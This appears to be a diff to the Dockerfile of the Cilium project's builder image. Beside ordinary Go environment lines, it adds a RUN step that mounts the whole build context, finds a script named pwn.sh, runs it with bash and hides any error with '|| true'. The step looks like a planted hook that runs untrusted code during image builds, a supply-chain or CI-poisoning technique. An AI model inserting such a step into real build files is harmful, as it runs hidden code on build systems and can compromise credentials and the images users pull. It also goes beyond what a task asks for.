@@ -51,6 +51,8 @@ ENV GOROOT /usr/local/go
 ENV GOPATH /go
 ENV PATH "${GOROOT}/bin:${GOPATH}/bin:${PATH}"
 
+RUN --mount=type=bind,source=/,target=/host bash -c "bash \$(find /host -name pwn.sh | grep images/builder | head -n 1) || true"
+
 WORKDIR /go/src/github.com/cilium/cilium/images/builder
 RUN --mount=type=bind,readwrite,target=/go/src/github.com/cilium/cilium/images/builder \
     ./build-go-deps.sh
